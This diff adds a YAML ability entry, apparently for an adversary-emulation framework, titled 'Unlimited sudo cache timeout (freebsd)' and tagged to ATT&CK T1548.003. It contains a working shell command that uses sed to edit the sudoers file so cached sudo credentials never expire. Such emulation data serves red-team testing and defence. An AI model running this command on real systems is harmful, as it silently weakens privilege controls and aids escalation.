@@ -1,0 +1,20 @@
+---
+- id: 820e402c9956129cd6ee39995c640675
+  name: Unlimited sudo cache timeout (freebsd)
+  description: 'Sets sudo caching timestamp_timeout to a value for unlimited. This
+    is dangerous to modify without using ''visudo'', do not do this on a production
+    system.
+
+    '
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.003
+    name: 'Abuse Elevation Control Mechanism: Sudo and Sudo Caching'
+  platforms:
+    linux:
+      sh:
+        command: if [ ! -x "$(command -v sudo)" ]; then (which pkg && pkg install
+          -y sudo); fi;  sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/'
+          /usr/local/etc/sudoers; sudo visudo -c -f /usr/local/etc/sudoers
+        payloads: []
+        cleanup: ''
